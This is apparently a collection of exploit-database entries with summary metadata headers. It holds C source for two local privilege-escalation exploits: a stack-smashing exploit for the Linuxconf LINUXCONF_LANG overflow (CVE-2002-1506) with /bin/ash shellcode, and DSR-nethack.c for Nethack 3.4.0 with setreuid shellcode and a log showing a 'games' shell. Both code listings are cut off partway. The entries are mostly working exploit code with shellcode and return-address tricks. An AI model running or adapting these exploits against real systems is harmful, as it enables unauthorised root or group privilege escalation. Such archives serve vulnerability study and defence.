// #<-- Publish Date --># // 2002-08-28 // #<-- Technical Document Summary (TDS) --># // Linuxconf contains a buffer overflow vulnerability caused by insufficient bounds checking of the LINUXCONF_LANG environment variable. The flaw allows an attacker to supply an excessively large string that overflows the allocated buffer, leading to arbitrary code execution. The affected component is the Linuxconf configuration utility, which uses setuid root privileges during installation. This vulnerability was reported in 2002 and has been assigned CVE-2002-1506. // #<-- Layman's Document Summary (LDS) --># // The weakness lies in improper validation of user-controlled input passed directly into a buffer write operation. An attacker can supply an overly long string to the LINUXCONF_LANG environment variable, causing the program to overwrite memory beyond its allocated limits. This allows execution of malicious code on the affected system. // #<-- Key Words (KW) --># // Linuxconf, buffer overflow, setuid root utility, environment variable, magic numbers, stack smashing, CVE-2002-1506 // #<-- Related Terms --># // environment variable overflow, local Linux configuration tool, Solucorp, setuid binary, memory corruption, exploit technique // #<-- Entities/Attributes --># // Software: Linuxconf // Version: 1.25r3 (as referenced) // Author: David Endler // Platform: Linux // Functions: malloc, get_esp, execl, putenv // Environment variable: LINUXCONF_LANG // Shellcode: NOP sequence followed by /bin/ash interpreter // #<-- Vulnerability Type --># // Buffer overflow leading to arbitrary code execution via environment variable manipulation. // #<-- Original Content --># // source: https://www.securityfocus.com/bid/5585/info Linuxconf is a Linux configuration utility from Solucorp. It is typically installed as a setuid root utility for the management and configuration of Linux operating systems. A buffer overflow vulnerability has been reported for Linuxconf. The vulnerability is due to insufficent bounds checking of the LINUXCONF_LANG environment variable. An attacker who sets the LINUXCONF_LANG environment variable with an overly large string will be able to cause the buffer overflow condition. /* * This is an exploit for the linuxconf overflow issue. * * The detail of this hole was published on 08.28.2002 by * David Endler from www.idefense.com. * * Tested to work on Redhat 7.0 with linuxconf 1.25r3. * [The magic numbers that worked for me are: 980 500 2048 1] * * This is a classical example of stack smashing. Large portion * of code were ripped from Aleph1's. So, credits due to him. * * Flame or comment goes to: jinyean@hotmail.com * */ #include <stdlib.h> #include <unistd.h> #define DEFAULT_ALIGN 0 #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 980 #define DEFAULT_EGG_SIZE 2048 #define NOP 0x90 char shellcode[]= "\xeb\x1f\x5e\x89\x76\x09\x31\xc0\x88\x46\x08\x89" "\x46\x0d\xb0\x0b\x89\xf3\x8d\x4e\x09\x8d\x56\x0d" "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff" "\xff\xff/bin/ash"; unsigned long get_esp(void) { __asm__("movl %esp,%eax"); } main(int argc, char *argv[]) { char *buff, *ptr, *egg; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i, eggsize=DEFAULT_EGG_SIZE, align=DEFAULT_ALIGN; if (argc>1) bsize=atoi(argv[1]); if (argc>2) offset=atoi(argv[2]); if (argc>3) eggsize=atoi(argv[3]); if (argc>4) align=atoi(argv[4]); if (!(buff=malloc(bsize))) { printf("Can't allocate memory.
"); exit(0); } if (!(egg=malloc(eggsize))) { printf("Can't allocate memory.
"); exit(0); } addr=get_esp()-offset; printf("Using address: 0x%x
",addr); ptr=buff; addr_ptr=(long *)(ptr+align); for (i=0; i<bsize; i+=4) *(addr_ptr++)=addr; ptr=egg; for (i=0; i<eggsize-strlen(shellcode)-1; i++) *(ptr++)=NOP; for (i=0; i<strlen(shellcode); i++) *(ptr++)=shellcode[i]; buff[bsize-1]='\0'; egg[eggsize-1]='\0'; memcpy(egg,"EGG=",4); putenv(egg); memcpy(buff,"LINUXCONF_LANG=",15);

// #<-- Publish Date --># // 2003-02-10 // #<-- Technical Document Summary (TDS) --># // The exploit leverages a local buffer overflow in Nethack 3.4.0 by writing an oversized string into a buffer, corrupting memory and enabling arbitrary code execution. This vulnerability allows an attacker to overwrite sensitive memory areas, potentially gaining elevated privileges on setgid 'games' systems. The affected component is the DSR-nethack.c file within Nethack. Not specified in source. // #<-- Layman's Document Summary (LDS) --># // A buffer overflow flaw caused by improper input validation corrupts memory when a large string is passed to nethack, leading to arbitrary code execution. This allows an attacker to run their own code and may elevate privileges on systems where the 'games' setgid binary runs. The vulnerability resides in Nethack's local handling of player type arguments. Not specified in source. // #<-- Key Words (KW) --># // shellcode, buffer overflow, local privilege escalation, nethack, DSR-nethack.c, RedHat 8.0 i386, x86, memory corruption, setgid games binary // #<-- Related Terms --># // exploit, buffer overflow, privilege escalation, Nethack, DSR-nethack.c, local vulnerability, code injection // #<-- Entities/Attributes --># // Software: Nethack; File: DSR-nethack.c; Vulnerability type: Local Buffer Overflow; Operating System: Linux; Architecture: i386; Function: main; Protocol: none; CVE: Not specified in source // #<-- Vulnerability Type --># // Not specified in source. // #<-- Original Content --># // source: https://www.securityfocus.com/bid/6806/info By passing an overly large string when invoking nethack, it is possible to corrupt memory. By exploiting this issue it may be possible for an attacker to overwrite values in sensitive areas of memory, resulting in the execution of arbitrary attacker-supplied code. As nethack may be installed setgid 'games' on various systems this may allow an attacker to gain elevated privileges. slashem, jnethack and falconseye are also prone to this vulnerability. /* DSR-nethack.c by bob@dtors.net * Vulnerbility Found by tsao. * * Local BufferOverflow that leads * to elevated privileges [games]. * * Basic PoC code...nothing special. *[bob@dtors bob]$ ./DSR-nethack * * DSR-nethack.c By bob. * Local Exploit for Nethack 3.4.0 * DSR-[www.dtors.net]-DSR * * ret: 0xbffffd86 * * Cannot find any current entries for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.��� * Usage: nethack -s [-v] <playertypes> [maxrank] [playernames] * Player types are: [-p role] [-r race] * sh-2.05b$ id -a * uid=12(games) gid=501(bob) groups=501(bob) * sh-2.05b$ * * www.dtors.net // www.b0f.net */ #include <stdio.h> char shellcode[]= /* shellcode by bob */ "\x29\xc4\x31\xc0\x31\xc9\x31\xdb\xb3\x0c\x89\xd9\xb0\x46\xcd\x80" //minus "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89" "\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"; int main () { unsigned long ret = 0xbffffd86; //Redhat 8.0 i386 char buf[224]; char smeg[1024]; char *ptr; int i=0; fprintf(stdout, "
	DSR-nethack.c By bob.
